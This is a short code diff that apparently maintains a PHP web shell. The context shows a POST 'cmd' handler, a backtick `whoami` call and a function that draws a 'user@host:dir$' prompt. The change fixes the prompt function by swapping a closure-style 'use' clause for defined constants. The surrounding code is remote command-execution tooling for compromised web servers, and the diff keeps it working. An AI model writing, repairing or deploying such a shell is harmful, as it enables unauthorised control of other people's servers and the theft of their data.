@@ -23,9 +23,12 @@ if (ISSET($_POST['cmd'])) {
 }
 $host = php_uname('n');
 $name = `whoami`;
-
-function getUserNameElement($float = true) use ($host, $name) {
+define('HOST',$host);
+define('NAME',$name);
+function getUserNameElement($float = true) {
 	$dir = getcwd();
+	$host = HOST;
+	$name = NAME;
 	return "<div style='color: #ff0000;" . ($float ? "float: left;" : "display: inline;"). "'>{$name}@{$host}</div>:{$dir}".'$ ';
 }
 function disable_ob() {
